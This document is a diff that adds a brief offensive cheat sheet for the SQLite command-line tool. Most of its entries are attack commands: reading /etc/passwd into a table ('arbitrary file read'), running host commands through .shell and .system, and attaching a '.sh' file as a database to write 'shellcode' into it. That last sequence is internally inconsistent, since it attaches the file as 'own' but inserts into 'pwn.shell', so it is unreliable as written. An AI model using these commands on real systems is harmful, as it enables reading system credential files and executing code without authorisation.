@@ -1,0 +1,31 @@
+SQLITE
+
+
+CLI USAGE
+sqlite3 target.db
+	--connect to database file
+
+
+OPERATIONS
+CREATE TABLE target.data (data TEXT);
+
+
+FUNCTIONS
+.tables
+	--enumerate tables
+.import /etc/passwd data
+select * from data;
+	--arbitrary file read
+.shell id
+	--execute shell command
+.system id
+	--execute command on host
+
+PRAGMAS
+PRAGMA database_list;
+	--enumerate databases
+PRAGMA temp_store_directory = '/tmp';
+	--set temporary storage file location
+ATTACH DATABASE '/tmp/file.sh' as own;
+CREATE TABLE own.shell (code TEXT);
+INSERT INTO pwn.shell (code) VALUES ('shellcode');
